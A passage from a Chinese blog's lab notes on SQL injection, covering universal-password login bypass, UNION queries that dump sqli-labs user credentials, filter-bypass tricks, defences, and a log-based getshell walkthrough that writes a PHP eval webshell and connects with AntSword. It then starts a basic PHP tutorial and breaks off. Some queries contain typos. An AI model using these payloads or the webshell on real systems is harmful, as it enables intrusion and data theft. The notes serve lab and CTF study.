Username= &#x27;.$username.&#x27; and Password= &#x27;.md5($password).&#x27;<br></code></pre></td></tr></table></figure><p>但是当我们输入万能密码的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from admin where Username=&#x27;1&#x27; or 1=1 or &#x27;1&#x27;=&#x27;1&#x27; and Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;<br></code></pre></td></tr></table></figure><p>由于’or’&lt;’and’&lt;’not’的关系</p><p>上面的情况就会变成 false or true or false</p><p>最后一个false是<code>&#39;1&#39;=&#39;1&#39; and Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code><br>因为密码是我们乱输入的，又会先计算and所以会变成false</p><h3 id="万能密码收集"><a href="#万能密码收集" class="headerlink" title="万能密码收集"></a>万能密码收集</h3><h1 id="sql注入做题的一般步骤"><a href="#sql注入做题的一般步骤" class="headerlink" title="sql注入做题的一般步骤"></a>sql注入做题的一般步骤</h1><h2 id="1-判断是字符型还是数字型"><a href="#1-判断是字符型还是数字型" class="headerlink" title="1  判断是字符型还是数字型"></a>1  判断是字符型还是数字型</h2><ol><li><pre><code class="mysql">?id=1&#39; and 1=2 --+   # 不显示?id=1 and 1=2 --+    # 显示<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><br>   字符型<br><br><span class="hljs-number">2</span>. ```mysql<br>   ?<span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>显示为正确为字符，显示错误为数字</code></pre></li><li><pre><code class="mysql">?id=1?id=2-1<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>   如果一项就是数字型，否则就是字符型<br><br><span class="hljs-bullet">4.</span> 补充知识关于注释符的使用<br><br></code></pre></td></tr></table></figure>注释符的种类# %23--+ 本来是--空格，这里我们使用--+来代替<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><br>- 注意sql语句后面加一个空格再接注释符不然会被解释成字符串<br><br>  ```mysql<br>  <span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span><span class="hljs-meta">%23</span><br></code></pre></td></tr></table></figure>  按道理来说后面添加了注释符，对的包裹就不完全，所以会报错，但是  ![image-20231015223300224](https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231015223300224.png)  没有报错，这种情况下就是把`&#39;2%23&#39;`当成了字符串，所以并不会起到注释的作用</code></pre></li></ol><h2 id="2-猜测sql查询的字段数目"><a href="#2-猜测sql查询的字段数目" class="headerlink" title="2  猜测sql查询的字段数目"></a>2  猜测sql查询的字段数目</h2><ol><li><p>使用order by</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1 order by 1<br>?id=1 order by 2<br># ....<br># 一直查到报错<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231015223810801.png" alt="image-20231015223810801"></p><p>3是正常的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231015223845453.png" alt="image-20231015223845453"></p><p>4就不正常了，可见字段只有3个</p></li></ol><h2 id="3-判断字段显示位"><a href="#3-判断字段显示位" class="headerlink" title="3  判断字段显示位"></a>3  判断字段显示位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,2,3<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231015224420388.png" alt="image-20231015224420388"></p><p>可见2,3是显示位</p><h2 id="4-查询数据库的信息"><a href="#4-查询数据库的信息" class="headerlink" title="4 查询数据库的信息"></a>4 查询数据库的信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,version(),database()<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231015224611665.png" alt="image-20231015224611665"></p><h2 id="5-查出数据库的表"><a href="#5-查出数据库的表" class="headerlink" title="5 查出数据库的表"></a>5 查出数据库的表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union selece 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231015225224440.png" alt="image-20231015225224440"></p><p>爆破出表名</p><h2 id="6-查表的字段名"><a href="#6-查表的字段名" class="headerlink" title="6  查表的字段名"></a>6  查表的字段名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,group_concat(column_name),3 from information——schema.columns where table_name=&quot;users&quot; <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231015225551176.png" alt="image-20231015225551176"></p><h2 id="7-爆破关键性信息"><a href="#7-爆破关键性信息" class="headerlink" title="7  爆破关键性信息"></a>7  爆破关键性信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,group_concat(username),group(passwrod) from security.users --+<br><br># 建议使用<br>union select 1,group_concat(id,&#x27;~&#x27;,username,&#x27;~&#x27;,password),3 from security.users --+<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231015230510288.png" alt="image-20231015230510288"></p><h2 id="8-使用通配符破解数据"><a href="#8-使用通配符破解数据" class="headerlink" title="8  使用通配符破解数据"></a>8  使用通配符破解数据</h2><h3 id="认识通配符"><a href="#认识通配符" class="headerlink" title="认识通配符"></a>认识通配符</h3><ol><li><p><code>#</code></p><p>匹配0个活多个</p><p>比较灵活</p></li><li><p><code>_</code></p><p>只能匹配一个</p></li></ol><h2 id="9-提升权限"><a href="#9-提升权限" class="headerlink" title="9  提升权限"></a>9  提升权限</h2><h2 id="10-内网渗透"><a href="#10-内网渗透" class="headerlink" title="10  内网渗透"></a>10  内网渗透</h2><h1 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h1><ol><li>我们可以控制传入的参数</li><li>参数会被带入到后端的数据库查询</li></ol><h1 id="sql注入练习"><a href="#sql注入练习" class="headerlink" title="sql注入练习"></a>sql注入练习</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>sqli-labs的第一道题</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>sqli-labs的第十一道题</p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>CTFhubs技能树  sql注入的ua注入</p><p>这道题是直接使用的是hackbar</p><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>最简单的一类sql注入</p><p>前提：页面有回显</p><p>主要使用的就是union select()</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="常用的报错函数"><a href="#常用的报错函数" class="headerlink" title="常用的报错函数"></a>常用的报错函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat() # 用于将多个字符串连接成一个字符串<br>floor(x) # 返回一个比小的整数<br>rand()   # 随机一个值<br>group by # 根据一个和多个结果进行分组，可以使用<br>group by one having count(*) # 分组并且计算<br>updatexml(xml_doument(文件名),XPath_string(文件路径),new_value(新的值)) # 更新xml文档的函数，xpath_expr： 需要更新的xml路径(Xpath格式)  用于个更新xml片段内容，将xml标记的片段给单个部分替换成xml_target，然后返回更改的xml<br></code></pre></td></tr></table></figure><p>xml<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="xml用于网络存储和数据交换的标签语言，类似于html但是没有预设的标签，都是用户自定义">[1]</span></a></sup></p><h3 id="报错注入的三种方式"><a href="#报错注入的三种方式" class="headerlink" title="报错注入的三种方式"></a>报错注入的三种方式</h3><ol><li>extractvalue()</li><li>updatexml()</li><li>floor()+rand()+group()</li></ol><h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h1 id="sql绕过"><a href="#sql绕过" class="headerlink" title="sql绕过"></a>sql绕过</h1><p>由于部分程序会对sql的语法进行检测，所以我们的sql语句不能再后端执行，我们需要绕过才行</p><h2 id="嵌套双写绕过"><a href="#嵌套双写绕过" class="headerlink" title="嵌套双写绕过"></a>嵌套双写绕过</h2><p>ununionion</p><h2 id="大小写混淆"><a href="#大小写混淆" class="headerlink" title="大小写混淆"></a>大小写混淆</h2><p>union Union</p><h2 id="通过内联注释"><a href="#通过内联注释" class="headerlink" title="通过内联注释"></a>通过内联注释</h2><h2 id="通过空格绕过"><a href="#通过空格绕过" class="headerlink" title="通过空格绕过"></a>通过空格绕过</h2><p>两个空格等于一个tab，所以我们使用  %a0&#x3D;空格的方式</p><p>%20%09%0a %0b %0c %0d %a0&#x2F;**&#x2F;</p><p>这个是最近的绕过方式，用注释代替空格</p><p>&#x2F;*注释*&#x2F;</p><h2 id="括号绕过空格"><a href="#括号绕过空格" class="headerlink" title="括号绕过空格"></a>括号绕过空格</h2><p>有些情况下空格会被过滤，但是括号不会</p><p>这种过滤方法常常用于  time based的盲注</p><h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><h2 id="比较符号绕过"><a href="#比较符号绕过" class="headerlink" title="比较符号绕过"></a>比较符号绕过</h2><h1 id="sql注入漏洞的危害以及如何防范sql注入"><a href="#sql注入漏洞的危害以及如何防范sql注入" class="headerlink" title="sql注入漏洞的危害以及如何防范sql注入"></a>sql注入漏洞的危害以及如何防范sql注入</h1><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol><li><p>未授权访问  导致信息泄露</p></li><li><p>可以对数据库的数据进行删除，操作</p><p>如果攻击者进行了增加和删除操作，添加了管理者用户，对公司的权益就很受损</p></li><li><p>可以控制后台，如果网站的目录存在可写的权限，可以写入木马，或者对页面进行篡改</p></li><li><p>攻击者提权获得远程服务器</p></li></ol><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ol><li>分级用户，严格控制权限</li><li>在书写Sql语言的时候，禁止直接将变量写入，而是通过设置相应的参数来传递相关的变量</li><li>具体检测变量的时候</li><li>使用安全的参数</li><li>通过专业的扫描工具</li><li>多层验证</li><li>数据库信息加密</li></ol><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users(username,id,password) values(?,?,?)<br></code></pre></td></tr></table></figure><p>使用这种语句的话，用户不能直接传入sql语句，而是使用的是具体的变量，进行赋值</p><h3 id="严格控制数据类型"><a href="#严格控制数据类型" class="headerlink" title="严格控制数据类型"></a>严格控制数据类型</h3><p>由于数据库部分是弱类型语言所以我们可以使用函数，进行判断用户的输入是字符还是数字</p><h2 id="对特殊字符进行转移"><a href="#对特殊字符进行转移" class="headerlink" title="对特殊字符进行转移"></a>对特殊字符进行转移</h2><p>使用转义的话，可以防止攻击者进行代码的闭合</p><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="sql中，group-concat-和concat-函数区别？"><a href="#sql中，group-concat-和concat-函数区别？" class="headerlink" title="sql中，group_concat()和concat()函数区别？"></a>sql中，group_concat()和concat()函数区别？</h2><blockquote><p>group_concat(column2 SEPARATOR separator)</p><p>concat()函数用于连接两个或多个字符串，并返回连接后的结果。它可以连接任意数量的字符串，并且可以包含常量、列名和函数等。</p></blockquote><h2 id="如何判断是盲注还是报错注入？"><a href="#如何判断是盲注还是报错注入？" class="headerlink" title="如何判断是盲注还是报错注入？"></a>如何判断是盲注还是报错注入？</h2><blockquote><p>看是否有回显<br>没有回显，只能通过某些特定的数值来判断，这个就是盲注</p><p>报错注入会有回显</p></blockquote><h2 id="如何判断是时间盲注还是布尔盲注？"><a href="#如何判断是时间盲注还是布尔盲注？" class="headerlink" title="如何判断是时间盲注还是布尔盲注？"></a>如何判断是时间盲注还是布尔盲注？</h2><blockquote><p>时间盲注的注入点的方法是在可能存在的注入点后加and sleep（值）来看浏览器相应时间和不加是的时间差</p></blockquote><h2 id="联合查询一般步骤是？"><a href="#联合查询一般步骤是？" class="headerlink" title="联合查询一般步骤是？"></a>联合查询一般步骤是？</h2><ol><li><p>检查是否存在sql漏洞</p></li><li><p>判断是文字型还是字符型</p></li><li><p>爆破库名</p></li><li><p>爆破表名</p></li><li><p>猜测表明</p></li><li><p>爆破字段</p></li></ol><h2 id="sql漏洞产生原理是什么？"><a href="#sql漏洞产生原理是什么？" class="headerlink" title="sql漏洞产生原理是什么？"></a>sql漏洞产生原理是什么？</h2><blockquote><p>没有过滤和内容检查</p></blockquote><h2 id="sql漏洞目前你能想到的修复方法有哪些？"><a href="#sql漏洞目前你能想到的修复方法有哪些？" class="headerlink" title="sql漏洞目前你能想到的修复方法有哪些？"></a>sql漏洞目前你能想到的修复方法有哪些？</h2><ol><li>使用白名单</li><li>做内容过滤</li><li>参数话查询</li><li>使用预编译的语言</li></ol><h2 id="我想查全局变量，请问有sql语句怎么实现？"><a href="#我想查全局变量，请问有sql语句怎么实现？" class="headerlink" title="我想查全局变量，请问有sql语句怎么实现？"></a>我想查全局变量，请问有sql语句怎么实现？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW VARIABLES;<br></code></pre></td></tr></table></figure><h2 id="CTF中拿到一个sql漏洞，你会使用万能密码么？"><a href="#CTF中拿到一个sql漏洞，你会使用万能密码么？" class="headerlink" title="CTF中拿到一个sql漏洞，你会使用万能密码么？"></a>CTF中拿到一个sql漏洞，你会使用万能密码么？</h2><h2 id="你怎么判断这个题是否会用到sql漏洞的知识点？"><a href="#你怎么判断这个题是否会用到sql漏洞的知识点？" class="headerlink" title="你怎么判断这个题是否会用到sql漏洞的知识点？"></a>你怎么判断这个题是否会用到sql漏洞的知识点？</h2><h1 id="关于日志getshell和慢日志getshell"><a href="#关于日志getshell和慢日志getshell" class="headerlink" title="关于日志getshell和慢日志getshell"></a>关于日志getshell和慢日志getshell</h1><p><strong>前提：</strong></p><ol><li>phpmyadmin利用日志文件getshell需要账号必须是可读可写权限</li><li>mysql 5.0以上</li><li>网站的绝对路径</li></ol><p><strong>思路：</strong></p><ol><li>通过修改日志文件的全局变量就可以getshell了</li></ol><h2 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h2><h3 id="mysql查询日志的方法"><a href="#mysql查询日志的方法" class="headerlink" title="mysql查询日志的方法"></a>mysql查询日志的方法</h3><ol><li><p>查询错误日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show variables like &#x27;log_error%&#x27;<br></code></pre></td></tr></table></figure></li><li><p>查询日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show variables like &#x27;general%&#x27;<br></code></pre></td></tr></table></figure></li><li><p>慢日志查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show variables like &#x27;slow-query%&#x27;<br></code></pre></td></tr></table></figure></li></ol><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li><p>查看配置信息（全局变量主要针对路径和日志的保存状态）</p><blockquote><p>SHOW VARIABLES LIKE ‘general%’;</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118215334385.png" alt="image-20231118215334385"></p></li><li><p>修改全局变量</p><blockquote><p> set global general_log&#x3D;on;</p></blockquote></li><li><p>创建自己的sqllog.php文件，我创建于phpstudy的根目录</p></li><li><p>设置日志的存储路径</p></li><li><p>完成修改</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118220336236.png" alt="image-20231118220336236"></p></li><li><p>尝试写入木马</p><blockquote><p>select ‘&lt;?php eval($_POST[cmd]); ?&gt;’;</p></blockquote></li><li><p>查看文件，但是我的文件被火绒处理了，证明了是可以的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118220953823.png" alt="image-20231118220953823"></p></li><li><p>尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118221547451.png" alt="image-20231118221547451"></p></li><li><p>使用蚁剑连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118221816563.png" alt="image-20231118221816563"></p><p>连接成功</p></li><li><p>总结与小知识</p><ul><li><p><strong>global</strong></p><p>关键字的命令是查看全局参数的值，而不带gloal的是当前的session</p></li><li><p><strong>variables</strong></p><p>在启动MySQL服务的时候，是可以修改具体的参数值来达<br>到对MySQL进行动态配置的目的，通常配置在MySQL的my.cnf配置文件中。这些参数中，有些动态的参数<br>可以通过<strong>set xxx&#x3D;yyy ;<strong>的方式来动态修改。<br>这种参数大多数以</strong>小写</strong>的英文字母开头。</p></li><li><p>status</p><p>status 查看的参数值是由MySQL自己统计计算得到的。它是MySQL服务运行状态具体的量化体现。都<br>是不可以修改的，也就是不能通过set xxx&#x3D;yyy; 的方式来改变它的值的。<br>这种参数大多数以大写的英文字母开头。</p></li><li><p>general_log</p><p>开启 general log 将所有到达MySQL Server的SQL语句记录下来。<br><strong>一般不会开启开功能</strong>，因为log的量会非常庞大。但个别情况下可能会临时的开一会儿general log以供排障使用。</p></li></ul></li></ol><h2 id="关于慢日志getshell"><a href="#关于慢日志getshell" class="headerlink" title="关于慢日志getshell"></a>关于慢日志getshell</h2><p>基本和上一个思路一致，只是处理的文件不同了</p><ol><li><p>查看全局参数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118224113503.png" alt="image-20231118224113503"></p></li><li><p>修改参数，添加路径</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118224225087.png" alt="image-20231118224225087"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118224208574.png" alt="image-20231118224208574"></p></li><li><p>写入木马</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118224251531.png" alt="image-20231118224251531"></p><p>这里有两个注意点</p><ul><li>执行时间需要等一下，这条命令不是执行完就能有回显</li><li>注意添加的木马是怎么写的</li></ul></li><li><p>尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231118224412973.png" alt="image-20231118224412973"></p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这两种getshell的方式都是通过将日志文作为我们的payload，通过此来连接getshell</p><h2 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h2><p>首先需要打开对应的日志系统，然后将日志文件设定成我们的payload载体，在使用select 添加一句话木马（这里都可以），因为日志是记录使用的命令</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>xml用于网络存储和数据交换的标签语言，类似于html但是没有预设的标签，都是用户自定义<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php</title>
    <link href="/2023/10/11/PHP/php/"/>
    <url>/2023/10/11/PHP/php/</url>
    
    <content type="html"><![CDATA[<h1 id="前提须知"><a href="#前提须知" class="headerlink" title="前提须知"></a>前提须知</h1><ol><li><p>php是弱类型的脚本语言<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="解释语言，不需要编译">[1]</span></a></sup></p></li><li><p>虽然在html里面使用php但是前端通过开发者工具是看不到的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/PHP/RapidLearning/image-20231011115354493.png" alt="image-20231011115354493"></p></li><li><p>使用echo输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">echo &quot;&lt;h1&gt;标题&lt;/h1&gt;&quot;<br></code></pre></td></tr></table></figure></li></ol><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>由于是弱语言所以我们只需要<code>$</code>进行操作就行了</p><ol><li><p>使用16进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$hex</span>=<span class="hljs-number">0x16</span><br></code></pre></td></tr></table></figure></li><li><p>使用判断</p><p><code>===</code></p></li></ol><h1 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h1><ol><li><p>拼接符号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;hhh&quot;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-string">&quot;dada&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span><br></code></pre></td></tr></table></figure></li><li><p>部分字符串处理的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//计算字符串的长度</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>);<br><span class="hljs-comment">//反转字符串</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>);<br><span class="hljs-comment">//从查找strpos()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&quot;h&quot;</span>);<br><span class="hljs-comment">//替换</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-variable">$c</span>)<br></code></pre></td></tr></table></figure></li><li><p>其他的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//计算字符串的长度</span><br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>);<br>   <span class="hljs-comment">//反转字符串</span><br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>);<br>   <span class="hljs-comment">//从查找strpos()</span><br>   <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&quot;h&quot;</span>);<br>   <span class="hljs-comment">//替换</span><br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-variable">$c</span>).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>   <span class="hljs-comment">//ceil 向上取整</span><br>   <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">ceil</span>(<span class="hljs-number">3.4</span>).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>   <span class="hljs-comment">//向下取整</span><br>   <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-number">4.2</span>).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>   <span class="hljs-comment">//取随机整数</span><br>   <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>);<br></code></pre></td></tr></table></figure></li><li><p>从前端获取输入</p><p>我们需要使用<code>html</code>的<code>form</code>表单形式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>     &lt;label <span 